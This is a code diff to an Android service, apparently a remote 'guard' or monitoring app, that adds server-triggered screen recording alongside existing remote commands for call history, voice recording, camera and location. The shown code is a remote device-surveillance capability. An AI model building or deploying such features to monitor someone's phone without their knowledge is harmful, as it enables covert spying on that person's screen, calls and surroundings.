@@ -22,6 +22,7 @@ class RemoteGuardService : LifecycleService() {
     private lateinit var locationManager: LocationManager
     private lateinit var cameraManager: CameraManager
     private lateinit var voiceRecordingManager: VoiceRecordingManager
+    private lateinit var screenRecordingManager: ScreenRecordingManager
     private var commandsRef: DatabaseReference? = null
     private var commandsListener: ChildEventListener? = null
     private val heartbeatHandler = Handler(Looper.getMainLooper())
@@ -39,6 +40,7 @@ class RemoteGuardService : LifecycleService() {
             locationManager = LocationManager(this)
             cameraManager = CameraManager(this)
             voiceRecordingManager = VoiceRecordingManager(this)
+            screenRecordingManager = ScreenRecordingManager(this)
             startForeground(NOTIFICATION_ID, createNotification())
             listenForCommands()
             heartbeatHandler.post(heartbeatRunnable)
@@ -186,6 +188,16 @@ class RemoteGuardService : LifecycleService() {
                     Log.d("RemoteGuardService", "Executing: get_call_history")
                     ContactsAndCallsManager.getCallHistory(this)
                 }
+                command == "start_screen_recording" -> {
+                    Log.d("RemoteGuardService", "Executing: start_screen_recording")
+                    val intent = Intent(this, ScreenCaptureActivity::class.java)
+                    intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                    startActivity(intent)
+                }
+                command == "stop_screen_recording" -> {
+                    Log.d("RemoteGuardService", "Executing: stop_screen_recording")
+                    screenRecordingManager.stopScreenRecording(this)
+                }
                 else -> {
                     Log.w("RemoteGuardService", "Unsupported command: $command")
                     cmdRef.child("status").setValue("failed")
@@ -211,6 +223,9 @@ class RemoteGuardService : LifecycleService() {
     override fun onDestroy() {
         if (voiceRecordingManager.isRecording) {
             voiceRecordingManager.stopAudioRecording(this)
+        }
+        if (screenRecordingManager.isRecording) {
+            screenRecordingManager.stopScreenRecording(this)
         }
         commandsRef?.let { ref ->
             commandsListener?.let { listener ->
